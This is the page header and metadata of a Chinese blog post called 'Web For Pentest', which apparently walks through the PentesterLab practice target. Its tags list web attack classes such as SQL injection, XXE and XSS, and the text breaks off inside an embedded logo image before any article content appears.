<!DOCTYPE html><html class="has-navbar-fixed-top" lang="zh-cmn-Hans"><head><meta charset="utf-8"><title>Web For Pentest - Zedd&#39;s Blog</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="ZeddYu's Blog"><meta name="description" content="很久之前就想做的靶机，一直没做，最近有空清理一下。地址在PentestLab"><meta property="og:type" content="article"><meta property="og:title" content="Web For Pentest"><meta property="og:url" content="https://blog.zeddyu.info/2019/03/08/Web-For-Pentest/index.html"><meta property="og:site_name" content="Zedd&#39;s Blog"><meta property="og:description" content="很久之前就想做的靶机，一直没做，最近有空清理一下。地址在PentestLab"><meta property="og:locale" content="en_US"><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="og:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><meta property="article:published_time" content="2019-03-08T23:31:42.000Z"><meta property="article:modified_time" content="2021-09-27T17:45:58.720Z"><meta property="article:author" content="Zedd"><meta property="article:tag" content="Sec"><meta property="article:tag" content="LFI"><meta property="article:tag" content="sql注入"><meta property="article:tag" content="xxe"><meta property="article:tag" content="xpath"><meta property="article:tag" content="LDAP注入"><meta property="article:tag" content="xss"><meta property="article:tag" content="RCE"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg=="><link rel="icon" href="/favicon.png"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bulma/0.8.1/css/bulma.min.css"><script defer="defer" src="https://at.alicdn.com/t/font_1780077_0ad2sbnz4nz.js"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/styles/atom-one-light.min.css"><link rel="stylesheet" href="/css/style.css"><script>window.ga_tid="UA-112937997-1",window.ga_api="https://blog.zeddyu.info/ga_api/*"</script><script src="https://cdn.jsdelivr.net/npm/cfga@1.0.3" async></script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Zedd's Blog" type="application/atom+xml"></head><body><nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation"><div class="container"><div class="navbar-brand"><div class="navbar-item navbar-logo"> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp